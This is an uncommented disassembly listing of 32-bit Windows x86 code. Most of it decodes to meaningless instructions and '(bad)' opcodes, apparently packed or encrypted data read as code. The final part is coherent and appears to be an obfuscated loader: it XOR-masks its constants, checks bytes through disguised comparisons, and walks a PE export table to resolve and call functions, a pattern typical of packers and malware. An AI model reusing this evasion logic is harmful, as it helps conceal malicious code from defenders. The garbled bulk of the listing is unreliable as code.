  40c05c:	push   edi
  40c05d:	sub    BYTE PTR [edi-0x68],bh
  40c060:	or     eax,0x9fbff95
  40c065:	mov    WORD PTR [eax],cs
  40c067:	(bad)  
  40c068:	adc    ebp,DWORD PTR [ebp-0x304b7e9e]
  40c06e:	inc    edi
  40c06f:	mov    eax,ds:0xafd0d0ed
  40c074:	inc    edi
  40c075:	stos   DWORD PTR es:[edi],eax
  40c076:	test   al,0x45
  40c078:	std    
  40c079:	cmp    BYTE PTR ds:0xa97558b1,al
  40c07f:	jmp    0x40c0a7
  40c081:	ins    DWORD PTR es:[edi],dx
  40c082:	add    eax,0x754fa53b
  40c087:	jp     0x40c0e6
  40c089:	mov    al,ds:0x555ffa26
  40c08e:	dec    edi
  40c08f:	gs or  ebx,ebp
  40c092:	lock mov ebx,0x8dd8c92
  40c098:	mov    bh,0xbb
  40c09a:	or     ah,bl
  40c09c:	(bad)  
  40c09d:	mov    edi,0xe3d82a49
  40c0a2:	inc    esp
  40c0a3:	lock pop es
  40c0a5:	adc    DWORD PTR [edi+edi*4+0x4e40280e],edx
  40c0ac:	cwde   
  40c0ad:	int    0x49
  40c0af:	mov    ebx,0x40aa2fc1
  40c0b4:	dec    ecx
  40c0b5:	test   dl,0xb7
  40c0b8:	and    ah,BYTE PTR [edx]
  40c0ba:	or     bl,BYTE PTR [esi]
  40c0bc:	cmp    eax,0xef43fec1
  40c0c1:	sbb    DWORD PTR [edi],ecx
  40c0c3:	inc    ebx
  40c0c4:	scas   eax,DWORD PTR es:[edi]
  40c0c5:	mov    cl,0xc1
  40c0c7:	adc    BYTE PTR [ebx-0x3ffa53e9],0x9a
  40c0ce:	(bad)  
  40c0cf:	gs out 0x17,al
  40c0d2:	out    0x63,al
  40c0d4:	hlt    
  40c0d5:	sti    
  40c0d6:	push   ebp
  40c0d7:	scas   al,BYTE PTR es:[edi]
  40c0d8:	enter  0x6189,0xec
  40c0dc:	gs mov es,eax
  40c0df:	push   edi
  40c0e0:	mov    bl,0xa3
  40c0e2:	(bad)  
  40c0e3:	fidivr DWORD PTR [esi+ecx*8-0x720757c1]
  40c0ea:	lods   al,BYTE PTR ds:[esi]
  40c0eb:	adc    al,0x71
  40c0ed:	inc    edx
  40c0ee:	fwait
  40c0ef:	add    BYTE PTR gs:[edi],0xf7
  40c0f3:	(bad)  
  40c0f4:	cdq    
  40c0f5:	fidivr DWORD PTR [esi]
  40c0f7:	xchg   esp,ebp
  40c0f9:	dec    edx
  40c0fa:	leave  
  40c0fb:	and    eax,0xfadf509d
  40c100:	mov    edi,0xd5c8b17b
  40c105:	test   eax,0xce96c121
  40c10a:	jae    0x40c0df
  40c10c:	mov    ah,0x5b
  40c10e:	jmp    FWORD PTR [edi-0x42e37539]
  40c114:	cs jl  0x40c0f5
  40c117:	pop    ecx
  40c118:	mov    ch,0xd6
  40c11a:	dec    ecx
  40c11b:	call   0x947:0xc775fc61
  40c122:	outs   dx,DWORD PTR ds:[esi]
  40c123:	jmp    0xf607:0xcce7fc9
  40c12a:	cs jno 0x40c157
  40c12d:	pop    es
  40c12e:	pop    edi
  40c12f:	push   ds
  40c130:	push   0x6093e475
  40c135:	imul   edi,DWORD PTR [eax+0x2f],0xc003d305
  40c13c:	ja     0x40c173
  40c13e:	out    dx,al
  40c13f:	jl     0x40c150
  40c141:	out    dx,al
  40c142:	adc    ebx,DWORD PTR [ebp+0x64]
  40c145:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40c147:	ret    0x9d08
  40c14a:	and    BYTE PTR [edi+0x3c37aa5d],0xdf
  40c151:	ficom  DWORD PTR [ebp-0x47]
  40c154:	adc    ecx,DWORD PTR [esi-0x16]
  40c157:	mov    esi,ecx
  40c159:	lahf   
  40c15a:	sti    
  40c15b:	aam    0x6
  40c15d:	jp     0x40c19b
  40c15f:	adc    ebx,edi
  40c161:	loop   0x40c104
  40c163:	lahf   
  40c164:	data16 jne 0x40c1df
  40c167:	clc    
  40c168:	mov    ch,0x53
  40c16a:	(bad)  
  40c16b:	jecxz  0x40c1e6
  40c16d:	cmc    
  40c16e:	pop    esi
  40c16f:	or     BYTE PTR [edi],dh
  40c171:	bound  edi,QWORD PTR [ecx-0x5]
  40c174:	aaa    
  40c175:	add    al,0xe
  40c177:	inc    ecx
  40c178:	xlat   BYTE PTR ds:[ebx]
  40c179:	out    0x8d,al
  40c17b:	push   esp
  40c17c:	pushf  
  40c17d:	mov    ?,esi
  40c17f:	sub    ch,BYTE PTR [ebx-0x5e0b6170]
  40c185:	dec    eax
  40c186:	mov    eax,ds:0xed4ebd57
  40c18b:	mov    DWORD PTR [ecx],edx
  40c18d:	inc    edx
  40c18e:	ins    DWORD PTR es:[edi],dx
  40c18f:	stc    
  40c190:	xchg   edx,eax
  40c191:	das    
  40c192:	push   ss
  40c193:	test   al,0x73
  40c195:	inc    esp
  40c196:	lock outs dx,DWORD PTR ds:[esi]
  40c198:	imul   ecx,DWORD PTR [esi-0x22],0x5a755ea1
  40c19f:	mul    BYTE PTR [ecx+0x1]
  40c1a2:	mov    esi,DWORD PTR [ebx]
  40c1a4:	or     DWORD PTR [eax+0x46],edx
  40c1a7:	xor    ch,0xbd
  40c1aa:	xchg   ebp,eax
  40c1ab:	clc    
  40c1ac:	xchg   ebx,eax
  40c1ad:	iret   
  40c1ae:	push   edi
  40c1af:	cmp    DWORD PTR [ebx+edi*1-0x3bc9231c],eax
  40c1b6:	leavew 
  40c1b8:	mov    ebx,0x21bf27f0
  40c1bd:	out    0x8d,al
  40c1bf:	xor    BYTE PTR [esi-0x4e],ah
  40c1c2:	shl    BYTE PTR [eax],cl
  40c1c4:	or     bl,BYTE PTR [ebp+0x24]
  40c1c7:	mov    WORD PTR [eax],cs
  40c1c9:	adc    eax,0x62e9f544
  40c1ce:	(bad)  
  40c1cf:	ror    DWORD PTR [eax-0x30],1
  40c1d2:	push   0x1a
  40c1d4:	je     0x40c1df
  40c1d6:	aas    
  40c1d7:	loopne 0x40c1f5
  40c1d9:	cld    
  40c1da:	dec    esi
  40c1db:	test   BYTE PTR [esi],bl
  40c1dd:	mov    al,ds:0xd8d6f8a6
  40c1e2:	inc    eax
  40c1e3:	repz sub eax,0xff8438bc
  40c1e9:	aaa    
  40c1ea:	cmp    DWORD PTR [ecx-0x1d],esp
  40c1ed:	jo     0x40c1f3
  40c1ef:	pmovmskb edi,mm3
  40c1f2:	sbb    eax,0xc4999740
  40c1f7:	sub    BYTE PTR [eax-0x1e5cd1c6],bl
  40c1fd:	iret   
  40c1fe:	xchg   DWORD PTR [eax],edx
  40c200:	sbb    bh,BYTE PTR [esi+0x9]
  40c203:	leave  
  40c204:	or     ch,BYTE PTR [edx]
  40c206:	mov    BYTE PTR [edx+0x77],0xe1
  40c20a:	popa   
  40c20b:	mov    ecx,0x5bb64571
  40c210:	sbb    esi,DWORD PTR [esi]
  40c212:	or     eax,0xcbcd0c6a
  40c217:	mov    ds,WORD PTR [edi+0x5dcb4c43]
  40c21d:	pop    edi
  40c21e:	dec    eax
  40c21f:	adc    al,0x14
  40c221:	js     0x40c1b3
  40c223:	mov    ebx,ss
  40c225:	xor    BYTE PTR [eax-0x35],bh
  40c228:	push   es
  40c229:	call   0xf94d:0xee0cafb8
  40c230:	cdq    
  40c231:	sbb    BYTE PTR [ecx+0x7c63925d],al
  40c237:	or     eax,0xc1bc1709
  40c23c:	inc    ebx
  40c23d:	ror    BYTE PTR [eax-0x6b7afad8],cl
  40c243:	sub    ebx,DWORD PTR [esi-0x4f16ff14]
  40c249:	pop    edx
  40c24a:	loopne 0x40c1ed
  40c24c:	mov    cs,WORD PTR [ecx-0x1c]
  40c24f:	fdiv   DWORD PTR [esi+0x77bf50ac]
  40c255:	mov    cl,0xbc
  40c257:	push   cs
  40c258:	mov    cl,0x9b
  40c25a:	mov    edi,0x160ef4b0
  40c25f:	es jb  0x40c29c
  40c262:	and    al,0xed
  40c264:	sub    BYTE PTR [ecx-0x404ca3d9],0x9
  40c26b:	(bad)  
  40c26c:	jg     0x40c212
  40c26e:	in     al,dx
  40c26f:	retf   
  40c270:	mov    ecx,0xbad9af0b
  40c275:	pop    edi
  40c276:	mov    cl,0x0
  40c278:	call   0xc97035da
  40c27d:	push   ds
  40c27e:	cs mov esp,0x983605e9
  40c284:	test   al,0x7d
  40c286:	pop    edx
  40c287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c288:	dec    edi
  40c289:	pop    ds
  40c28a:	mov    cl,0x37
  40c28c:	push   es
  40c28d:	and    DWORD PTR [edi-0x397f2d58],0x48
  40c294:	sub    bh,BYTE PTR [edx+ecx*4]
  40c297:	cmp    eax,0x7a56d11e
  40c29c:	xchg   ebp,eax
  40c29d:	xchg   esp,eax
  40c29e:	xlat   BYTE PTR ds:[ebx]
  40c29f:	(bad)  
  40c2a0:	std    
  40c2a1:	push   eax
  40c2a2:	mov    al,0xdc
  40c2a4:	aad    0x2d
  40c2a6:	inc    ebx
  40c2a7:	sti    
  40c2a8:	sub    DWORD PTR [edx],edi
  40c2aa:	push   ss
  40c2ab:	popa   
  40c2ac:	inc    ebx
  40c2ad:	mov    ecx,0x96c8797b
  40c2b2:	pop    ds
  40c2b3:	in     eax,dx
  40c2b4:	dec    ebx
  40c2b5:	lea    ebp,[edx-0x34]
  40c2b8:	cld    
  40c2b9:	jl     0x40c287
  40c2bb:	loop   0x40c328
  40c2bd:	xchg   esp,eax
  40c2be:	out    dx,eax
  40c2bf:	loope  0x40c2cc
  40c2c1:	xor    DWORD PTR [ebx+0xc],ecx
  40c2c4:	mov    cs,WORD PTR [esi]
  40c2c6:	jne    0x40c2d1
  40c2c8:	(bad)  
  40c2c9:	sub    al,0xe6
  40c2cb:	or     al,0x66
  40c2cd:	push   0x1c
  40c2cf:	jl     0x40c30a
  40c2d1:	js     0x40c2b7
  40c2d3:	or     BYTE PTR [eax-0x59],dh
  40c2d6:	int3   
  40c2d7:	loop   0x40c295
  40c2d9:	in     al,0x44
  40c2db:	stos   BYTE PTR es:[edi],al
  40c2dc:	in     al,0xec
  40c2de:	mov    edx,0xe5cb23fe
  40c2e3:	xor    al,0x92
  40c2e5:	mov    bh,BYTE PTR [ebp-0x4dc83aa1]
  40c2eb:	outs   dx,BYTE PTR ds:[esi]
  40c2ec:	fldcw  WORD PTR [ecx-0x2dcf23a3]
  40c2f2:	adc    BYTE PTR [edx-0x6b],bl
  40c2f5:	and    al,BYTE PTR ds:0xdffa97bb
  40c2fb:	lea    ebx,[eax-0x73]
  40c2fe:	scas   al,BYTE PTR es:[edi]
  40c2ff:	shl    cl,cl
  40c301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c302:	dec    esp
  40c303:	dec    ecx
  40c304:	adc    bh,BYTE PTR [edi+0x1bd5eb51]
  40c30a:	add    dl,BYTE PTR [ebp+0x39]
  40c30d:	xor    ah,BYTE PTR [eax]
  40c30f:	fwait
  40c310:	pop    eax
  40c311:	or     esi,esi
  40c313:	or     DWORD PTR [ebx],edi
  40c315:	(bad)  
  40c316:	out    0xe3,eax
  40c318:	cdq    
  40c319:	sub    BYTE PTR [edi-0x49b97fc3],dh
  40c31f:	pop    edi
  40c320:	push   ss
  40c321:	das    
  40c322:	jecxz  0x40c318
  40c324:	pushf  
  40c325:	dec    eax
  40c326:	adc    BYTE PTR [ecx+esi*1],dh
  40c329:	pop    edi
  40c32a:	es push ds
  40c32c:	outs   dx,DWORD PTR ds:[esi]
  40c32d:	mov    ah,0x3a
  40c32f:	xlat   BYTE PTR ds:[ebx]
  40c330:	jge    0x40c2b2
  40c332:	call   0x8d27:0x866fff19
  40c339:	in     al,0xe8
  40c33b:	rcr    edx,1
  40c33d:	xor    cl,BYTE PTR [esi-0x76]
  40c340:	dec    ebx
  40c341:	ror    DWORD PTR [esi-0x54],0xcc
  40c345:	call   0xeaee845d
  40c34a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c34b:	xor    cl,BYTE PTR [ebp+0x77]
  40c34e:	add    edi,DWORD PTR [ecx+0x21]
  40c351:	fwait
  40c352:	sub    al,0x69
  40c354:	sahf   
  40c355:	fimul  DWORD PTR [eax-0x6ba326d9]
  40c35b:	pop    ds
  40c35c:	das    
  40c35d:	push   edi
  40c35e:	repnz add esi,DWORD PTR ss:[edx+0x3e]
  40c363:	inc    eax
  40c364:	clc    
  40c365:	mov    ebp,0xffe82b5c
  40c36a:	loop   0x40c330
  40c36c:	sub    al,0xc3
  40c36e:	push   ds
  40c36f:	xor    eax,0xad8646ca
  40c374:	lods   al,BYTE PTR ds:[esi]
  40c375:	mov    eax,ds:0xe69d3777
  40c37a:	add    eax,0xc33f545
  40c37f:	mov    ch,0xcb
  40c381:	fnstcw WORD PTR [eax]
  40c383:	in     al,0x86
  40c385:	pop    ebp
  40c386:	cli    
  40c387:	pusha  
  40c388:	mov    edi,ebp
  40c38a:	add    ecx,DWORD PTR [ebp-0x30ca0f16]
  40c390:	shl    BYTE PTR [edx+0x41],1
  40c393:	jl     0x40c3e1
  40c395:	fbstp  TBYTE PTR [edi-0x6e]
  40c398:	out    dx,eax
  40c399:	push   0xffffff91
  40c39b:	xchg   ebp,eax
  40c39c:	jl     0x40c3cb
  40c39e:	inc    esi
  40c39f:	lock lock cmp BYTE PTR [eax-0x7b],dh
  40c3a4:	punpckhwd mm2,mm5
  40c3a7:	mov    edx,0x7164beb3
  40c3ac:	push   ebp
  40c3ad:	pop    eax
  40c3ae:	push   ds
  40c3af:	inc    esp
  40c3b0:	pusha  
  40c3b1:	sbb    DWORD PTR [ecx-0x24],eax
  40c3b4:	stos   BYTE PTR es:[edi],al
  40c3b5:	dec    edx
  40c3b6:	cld    
  40c3b7:	sub    DWORD PTR [edi+0x6c],ecx
  40c3ba:	ss daa 
  40c3bc:	add    al,0x74
  40c3be:	pop    ecx
  40c3bf:	retf   
  40c3c0:	ret    0xbe51
  40c3c3:	lods   al,BYTE PTR ds:[esi]
  40c3c4:	pop    es
  40c3c5:	pop    esp
  40c3c6:	imul   esp,DWORD PTR [edx+0x2e],0x1668efd4
  40c3cd:	sub    BYTE PTR [esi-0x13],ah
  40c3d0:	outs   dx,DWORD PTR ds:[esi]
  40c3d1:	adc    al,0x15
  40c3d3:	ds fdivr st,st(3)
  40c3d6:	add    DWORD PTR [eax-0x53c017e8],esi
  40c3dc:	aam    0xe3
  40c3de:	aam    0x3f
  40c3e0:	popf   
  40c3e1:	and    eax,0x3d2e4524
  40c3e6:	call   0x7d28:0xb83f70e0
  40c3ed:	div    BYTE PTR [edx-0x74]
  40c3f0:	add    edx,DWORD PTR [ebp-0x54]
  40c3f3:	lahf   
  40c3f4:	aam    0xcc
  40c3f6:	xchg   esp,eax
  40c3f7:	stos   BYTE PTR es:[edi],al
  40c3f8:	jnp    0x40c426
  40c3fa:	lea    esi,[ecx-0x5733d0eb]
  40c400:	jmp    0x6567:0x49bd15d0
  40c407:	daa    
  40c408:	jne    0x40c460
  40c40a:	dec    esp
  40c40b:	xchg   ebp,eax
  40c40c:	cli    
  40c40d:	ret    0xc8ff
  40c410:	dec    eax
  40c411:	aas    
  40c412:	add    al,0xc5
  40c414:	ja     0x40c473
  40c416:	pop    ss
  40c417:	shl    edi,cl
  40c419:	loope  0x40c482
  40c41b:	and    DWORD PTR [edx],ecx
  40c41d:	pop    ebp
  40c41e:	mov    ds:0x6fb177d8,eax
  40c423:	std    
  40c424:	sub    BYTE PTR [edi-0x52c0c2eb],dh
  40c42a:	es xchg esi,eax
  40c42c:	leave  
  40c42d:	lea    edx,[ebx]
  40c42f:	jo     0x40c46a
  40c431:	cmp    eax,0xb34f1e62
  40c436:	jb     0x40c410
  40c438:	sar    BYTE PTR [ebx],cl
  40c43a:	ss ret 
  40c43c:	xchg   esi,eax
  40c43d:	mov    cl,BYTE PTR [edx+0x2bf7649c]
  40c443:	in     eax,dx
  40c444:	in     eax,dx
  40c445:	daa    
  40c446:	icebp  
  40c447:	pop    eax
  40c448:	out    0xb5,eax
  40c44a:	mov    ch,0xe2
  40c44c:	or     eax,0x3511a6a3
  40c451:	pop    eax
  40c452:	sbb    DWORD PTR [ecx+0x5d],eax
  40c455:	pop    esi
  40c456:	adc    al,0xe7
  40c458:	out    dx,al
  40c459:	dec    edi
  40c45a:	pop    edi
  40c45b:	fs and al,0x5
  40c45e:	inc    eax
  40c45f:	ret    
  40c460:	imul   edx,DWORD PTR [ebx-0x7],0x577c8498
  40c467:	sahf   
  40c468:	or     eax,0xa8530525
  40c46d:	fucomip st,st(3)
  40c46f:	leave  
  40c470:	jo     0x40c4c1
  40c472:	push   edi
  40c473:	adc    eax,0xdfc92f70
  40c478:	imul   esi,DWORD PTR [ecx],0xffffffd9
  40c47b:	xchg   edx,eax
  40c47c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c47d:	iret   
  40c47e:	out    dx,eax
  40c47f:	jnp    0x40c4f5
  40c481:	aad    0xb9
  40c483:	mov    eax,0xe6a803e9
  40c488:	int    0xca
  40c48a:	enter  0xd967,0xfb
  40c48e:	xchg   esi,eax
  40c48f:	imul   edx,DWORD PTR [esi+0x60],0xffffffb6
  40c493:	sahf   
  40c494:	adc    al,0x21
  40c496:	jecxz  0x40c4fe
  40c498:	jnp    0x40c4a7
  40c49a:	jle    0x40c4df
  40c49c:	xlat   BYTE PTR ds:[ebx]
  40c49d:	ins    DWORD PTR es:[edi],dx
  40c49e:	mov    eax,0x3491f799
  40c4a3:	sbb    al,0x5b
  40c4a5:	mov    al,ds:0x2a32b1be
  40c4aa:	cmp    eax,0xd1e3679c
  40c4af:	fnsave [ecx]
  40c4b1:	sahf   
  40c4b2:	mov    al,0x9b
  40c4b4:	dec    ebp
  40c4b5:	retf   
  40c4b6:	call   DWORD PTR [edx-0x7]
  40c4b9:	gs or  dh,bh
  40c4bc:	mov    edx,0xbe4c091e
  40c4c1:	cmp    al,0x86
  40c4c3:	test   al,0x37
  40c4c5:	(bad)  
  40c4c6:	rcl    DWORD PTR [ebx],1
  40c4c8:	adc    BYTE PTR [ecx],ch
  40c4ca:	add    eax,0x9088f9e8
  40c4cf:	mov    ecx,0x4a997aee
  40c4d4:	and    DWORD PTR [edx],edx
  40c4d6:	adc    BYTE PTR [esi],dl
  40c4d8:	jg     0x40c494
  40c4da:	test   al,0xf0
  40c4dc:	cmc    
  40c4dd:	scas   al,BYTE PTR es:[edi]
  40c4de:	fcomip st,st(1)
  40c4e0:	add    DWORD PTR [edi+ebp*1],0x53
  40c4e4:	pop    esp
  40c4e5:	sub    al,0xc0
  40c4e7:	retf   0x28cc
  40c4ea:	out    0x89,eax
  40c4ec:	in     al,0xc9
  40c4ee:	call   0xd174:0xaef40bed
  40c4f5:	rcl    eax,1
  40c4f7:	loope  0x40c492
  40c4f9:	xlat   BYTE PTR ds:[ebx]
  40c4fa:	out    dx,al
  40c4fb:	clc    
  40c4fc:	mov    dh,BYTE PTR [esi+0x3cd6f070]
  40c502:	out    0x2d,eax
  40c504:	cmc    
  40c505:	jne    0x40c50e
  40c507:	or     eax,0x69e65a16
  40c50c:	call   0xe6fb279d
  40c511:	sbb    DWORD PTR [eax-0x52fc6eef],esp
  40c517:	sub    BYTE PTR [edx+0x7c],ch
  40c51a:	push   ss
  40c51b:	ins    DWORD PTR es:[edi],dx
  40c51c:	push   ecx
  40c51d:	popa   
  40c51e:	xchg   ebp,eax
  40c51f:	and    al,0x75
  40c521:	in     al,dx
  40c522:	sub    eax,0xcc972cea
  40c527:	push   0x73
  40c529:	cli    
  40c52a:	xchg   esp,eax
  40c52b:	(bad)  
  40c52c:	mov    ds,WORD PTR [ecx-0x2d161835]
  40c532:	cmp    ah,BYTE PTR [esi-0x471e4dc5]
  40c538:	and    edi,ebp
  40c53a:	aad    0x74
  40c53c:	push   ebp
  40c53d:	int3   
  40c53e:	sbb    ebx,esi
  40c540:	xchg   BYTE PTR [ebx-0x3c622c20],bl
  40c546:	int3   
  40c547:	push   cs
  40c548:	mov    WORD PTR [ebx+0x1e],ss
  40c54b:	push   ebx
  40c54c:	(bad)  
  40c54d:	push   0x3d
  40c54f:	fild   DWORD PTR [edi-0x29]
  40c552:	popa   
  40c553:	cwde   
  40c554:	pusha  
  40c555:	mov    DWORD PTR [ecx+0x10],ecx
  40c558:	mov    dh,0x2b
  40c55a:	xor    DWORD PTR [esi+edi*4+0x4b],0x76
  40c55f:	jnp    0x40c5a3
  40c561:	push   ecx
  40c562:	pop    ebx
  40c563:	mov    bh,0xf0
  40c565:	iret   
  40c566:	hlt    
  40c567:	lock mov esp,0xcc6da318
  40c56d:	xchg   esp,eax
  40c56e:	mov    dh,0x5d
  40c570:	jecxz  0x40c515
  40c572:	jmp    0x5830:0x4aa23fce
  40c579:	rcl    BYTE PTR ds:0xb6982ae0,1
  40c57f:	xchg   edx,eax
  40c580:	mov    eax,0x3edbcedc
  40c585:	scas   eax,DWORD PTR es:[edi]
  40c586:	ror    BYTE PTR [ecx],cl
  40c588:	movsx  edi,WORD PTR [esi-0x55]
  40c58c:	adc    ebp,edx
  40c58e:	xor    eax,edx
  40c590:	pop    ebp
  40c591:	sub    DWORD PTR ds:0xc08a6f1a,ecx
  40c597:	aaa    
  40c598:	in     al,0xe9
  40c59a:	mov    edx,0xe004041c
  40c59f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5a0:	jmp    0x40c600
  40c5a2:	outs   dx,BYTE PTR ds:[esi]
  40c5a3:	mov    edx,edi
  40c5a5:	push   eax
  40c5a6:	out    dx,eax
  40c5a7:	lea    ebx,[edi+0x2d2053e1]
  40c5ad:	sbb    cl,BYTE PTR [eax+0x618ea7df]
  40c5b3:	sbb    al,0x3c
  40c5b5:	call   0x5748c420
  40c5ba:	mov    gs,ebp
  40c5bc:	inc    esp
  40c5bd:	jmp    0x4257:0x4ef75449
  40c5c4:	jmp    0x7410:0x8e6ff76
  40c5cb:	mov    edi,0x588fb501
  40c5d0:	stc    
  40c5d1:	fstp   QWORD PTR [edx+0x23]
  40c5d4:	add    BYTE PTR [ecx+0x4d],dl
  40c5d7:	mov    ebp,0x9a0dec90
  40c5dc:	mov    edi,0xa32005d1
  40c5e1:	test   ebx,0x3ef7ff48
  40c5e7:	ret    
  40c5e8:	sbb    eax,0xf49c63df
  40c5ed:	mov    eax,0xd8ee7754
  40c5f2:	xchg   DWORD PTR [edx-0x6e474f79],ebx
  40c5f8:	xor    DWORD PTR [edx],ebp
  40c5fa:	sbb    edi,DWORD PTR [ecx-0x5e]
  40c5fd:	cmp    bh,BYTE PTR [edx+0x468b07b8]
  40c603:	das    
  40c604:	mov    eax,0x68e620c1
  40c609:	mov    dh,BYTE PTR [ecx]
  40c60b:	adc    al,0x3
  40c60d:	fs cmp ah,0xf7
  40c611:	retf   0x1a36
  40c614:	shl    BYTE PTR [esi-0xd],0x3
  40c618:	dec    esp
  40c619:	jns    0x40c62c
  40c61b:	ror    BYTE PTR [edx],cl
  40c61d:	push   ecx
  40c61e:	mov    eax,0xadc1df58
  40c623:	mov    dl,dh
  40c625:	clc    
  40c626:	xchg   edi,eax
  40c627:	cmp    DWORD PTR [eax+0x12],esp
  40c62a:	ss push ss
  40c62c:	cmp    ah,BYTE PTR [eax]
  40c62e:	dec    ebx
  40c62f:	ret    0x950f
  40c632:	dec    eax
  40c633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c634:	xor    eax,ecx
  40c636:	lea    eax,[eax+edi*1+0x64e5c0]
  40c63d:	mov    edi,DWORD PTR [ebp+0xc]
  40c640:	xor    edi,ecx
  40c642:	add    edi,edx
  40c644:	imul   eax,edi
  40c647:	mov    edi,DWORD PTR [ebp+0xc]
  40c64a:	xor    edi,ecx
  40c64c:	sub    edi,eax
  40c64e:	mov    eax,DWORD PTR [ebp-0x4]
  40c651:	add    edi,edx
  40c653:	cmp    DWORD PTR [eax],edi
  40c655:	mov    eax,DWORD PTR [ebp-0x4]
  40c658:	mov    edi,DWORD PTR [ebp+0x10]
  40c65b:	jg     0x40c66e
  40c661:	xor    edi,ecx
  40c663:	mov    ebx,esi
  40c665:	sub    ebx,edi
  40c667:	add    DWORD PTR [eax],ebx
  40c669:	jmp    0x40c674
  40c66e:	xor    edi,ecx
  40c670:	add    edi,edx
  40c672:	add    DWORD PTR [eax],edi
  40c674:	mov    eax,DWORD PTR [ebp-0x8]
  40c677:	mov    edi,DWORD PTR [ebp-0x10]
  40c67a:	mov    eax,DWORD PTR [eax]
  40c67c:	xor    edi,ecx
  40c67e:	add    edi,0x3272df
  40c684:	not    edi
  40c686:	and    eax,edi
  40c688:	movsx  di,BYTE PTR [eax+0x1]
  40c68d:	mov    ebx,0x3b50
  40c692:	sub    di,bx
  40c695:	mov    ebx,0x8a8c
  40c69a:	xor    di,bx
  40c69d:	mov    ebx,0x4f86
  40c6a2:	cmp    di,bx
  40c6a5:	jne    0x40c6cd
  40c6ab:	movsx  di,BYTE PTR [eax]
  40c6af:	mov    ebx,0x3b50
  40c6b4:	sub    di,bx
  40c6b7:	mov    ebx,0x8a8c
  40c6bc:	xor    di,bx
  40c6bf:	mov    ebx,0x4e71
  40c6c4:	cmp    di,bx
  40c6c7:	je     0x40c6dd
  40c6cd:	mov    edi,DWORD PTR [ebp-0x10]
  40c6d0:	xor    edi,ecx
  40c6d2:	mov    ebx,esi
  40c6d4:	sub    ebx,edi
  40c6d6:	add    eax,ebx
  40c6d8:	jmp    0x40c688
  40c6dd:	mov    esi,DWORD PTR [ebp-0x14]
  40c6e0:	mov    esi,DWORD PTR [esi]
  40c6e2:	mov    edi,DWORD PTR [eax+0x3c]
  40c6e5:	lea    esi,[edi+esi*8+0x78]
  40c6e9:	mov    esi,DWORD PTR [esi+eax*1]
  40c6ec:	mov    DWORD PTR [ebp-0x8],esi
  40c6ef:	mov    esi,DWORD PTR [ebp+0x8]
  40c6f2:	xor    esi,ecx
  40c6f4:	add    esi,edx
  40c6f6:	mov    DWORD PTR [ebp-0x14],esi
  40c6f9:	mov    esi,DWORD PTR [ebp+0x8]
  40c6fc:	mov    edi,DWORD PTR [ebp-0x8]
  40c6ff:	xor    esi,ecx
  40c701:	add    esi,edx
  40c703:	pop    ebx
  40c704:	cmp    edi,esi
  40c706:	jne    0x40c724
  40c70c:	mov    eax,DWORD PTR [ebp+0xc]
  40c70f:	xor    eax,ecx
  40c711:	mov    ecx,DWORD PTR [ebp-0x8]
  40c714:	add    eax,edx
  40c716:	imul   eax,ecx
  40c719:	mov    DWORD PTR [ebp-0x8],eax
  40c71c:	push   DWORD PTR [ebp+0x18]
  40c71f:	jmp    0x40c778
  40c724:	mov    ecx,DWORD PTR [ebp-0x8]
  40c727:	add    ecx,eax
  40c729:	mov    DWORD PTR [ebp-0x14],ecx
  40c72c:	mov    ecx,DWORD PTR [ebp-0x14]
  40c72f:	mov    ecx,DWORD PTR [ecx+0xc]
  40c732:	movsx  cx,BYTE PTR [ecx+eax*1]
  40c737:	mov    edx,0x3b50
  40c73c:	sub    cx,dx
  40c73f:	mov    edx,0x8a8c
  40c744:	xor    cx,dx
  40c747:	mov    edx,0x4e77
  40c74c:	cmp    cx,dx
  40c74f:	jne    0x40c71c
  40c755:	mov    ecx,DWORD PTR ds:0x42e313
  40c75b:	mov    ecx,DWORD PTR [ecx+0x198]
  40c761:	mov    DWORD PTR [ecx],eax
  40c763:	jmp    0x40c789
  40c768:	mov    ecx,DWORD PTR [ebp+0x18]
  40c76b:	cmp    ecx,0xf89c85b8
  40c771:	jne    0x40c789
  40c777:	push   eax
  40c778:	push   DWORD PTR [ebp+0x14]
  40c77b:	push   DWORD PTR [ebp+0x10]
  40c77e:	push   DWORD PTR [ebp+0xc]
  40c781:	push   DWORD PTR [ebp+0x8]
  40c784:	call   0x409ed5
  40c789:	pop    edi
  40c78a:	pop    esi
  40c78b:	leave  
  40c78c:	ret    0x14
  40c78f:	push   ebp
  40c790:	mov    ebp,esp
  40c792:	sub    esp,0xc
  40c795:	push   esi
  40c796:	mov    esi,DWORD PTR ds:0x41ac40
  40c79c:	mov    ecx,DWORD PTR ds:0x41abdd
  40c7a2:	sub    esi,ecx
  40c7a4:	xor    esi,DWORD PTR [esi+ecx*1]
  40c7a7:	mov    esi,0xf89c85b9
  40c7ac:	sub    ecx,edx
  40c7ae:	mov    DWORD PTR [ebp-0x8],esi
  40c7b1:	sub    DWORD PTR ds:0x42b010,edi
  40c7b7:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  40c7be:	and    DWORD PTR ds:0x42901c,0x0
  40c7c8:	mov    edx,DWORD PTR ds:0x42901c
  40c7ce:	inc    edx
  40c7cf:	mov    DWORD PTR ds:0x42901c,edx
  40c7d5:	cmp    DWORD PTR ds:0x42901c,0x24
  40c7dc:	jne    0x40c7ed
  40c7e2:	push   0x42e127
  40c7e7:	call   DWORD PTR ds:0x42e9cb
  40c7ed:	cmp    DWORD PTR ds:0x42901c,0x18
  40c7f4:	jb     0x40c7c8
  40c7fa:	push   edi
  40c7fb:	mov    eax,eax
  40c7fd:	mov    eax,DWORD PTR [ebp-0x4]
  40c800:	mov    edi,DWORD PTR [ebp-0x8]
  40c803:	mov    ecx,0x7510899
  40c808:	xor    eax,ecx
  40c80a:	sub    edx,0x2378
  40c810:	xor    edi,ecx
  40c812:	adc    DWORD PTR ds:0x429020,0x74b2
  40c81c:	mov    edx,0x3272e0
  40c821:	mov    DWORD PTR ds:0x42901c,0x186b
  40c82b:	add    edi,edx
  40c82d:	add    eax,edx
  40c82f:	imul   eax,edi
  40c832:	mov    DWORD PTR ds:0x42b000,edi
  40c838:	mov    edi,DWORD PTR [ebp+0xc]
  40c83b:	cmp    edi,eax
  40c83d:	je     0x40c8c6
